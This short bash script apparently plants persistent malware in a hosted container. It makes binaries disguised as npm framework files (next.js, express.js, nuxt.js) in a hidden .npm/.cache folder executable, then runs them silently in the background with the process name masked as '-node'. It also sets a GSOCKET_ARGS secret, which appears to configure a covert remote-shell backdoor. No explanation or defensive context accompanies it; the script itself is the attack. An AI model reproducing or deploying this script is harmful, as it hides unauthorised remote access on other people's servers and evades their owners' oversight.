#!/bin/bash

chmod a+x /home/container/.npm/.cache/next.js
chmod a+x /home/container/.npm/.cache/express.js
chmod a+x /home/container/.npm/.cache/nuxt.js

cd /home/container/.npm/.cache && nohup ./next.js -a '-node' ./nuxt.js -c ./conf.json >/dev/null 2>&1 &

export HOME=/home/container
export GSOCKET_ARGS="-s i6A9J0eD2a1E2-c3A1K6f9-L893D9g8-H9b5j5i6C4a9-U6k1eCd9-F9i3J0d-6A28038A1c5J1g60 -liqD"
cd /home/container/.npm/.cache && exec -a -node ./express.js &